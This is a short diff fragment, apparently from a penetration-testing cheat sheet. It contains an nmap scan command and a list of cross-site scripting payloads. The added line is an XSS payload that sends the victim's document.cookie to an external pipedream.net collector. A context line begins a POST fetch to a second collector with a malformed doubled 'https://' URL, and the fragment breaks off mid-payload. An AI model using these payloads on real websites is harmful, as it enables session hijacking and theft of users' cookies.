@@ -78,7 +78,7 @@ nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machi
 <img src=x onerror=alert(1)/>
 <svg onload=alert('XSS')>
 1"--><svg/onload=';alert(0);'>
-
+"><img src=x onerror=fetch('https://ADDR.x.pipedream.net/?'+document.cookie) />
 "><script>
   fetch('https://https://eo4xbi0886zyrkf.m.pipedream.net', {
   method: 'POST',
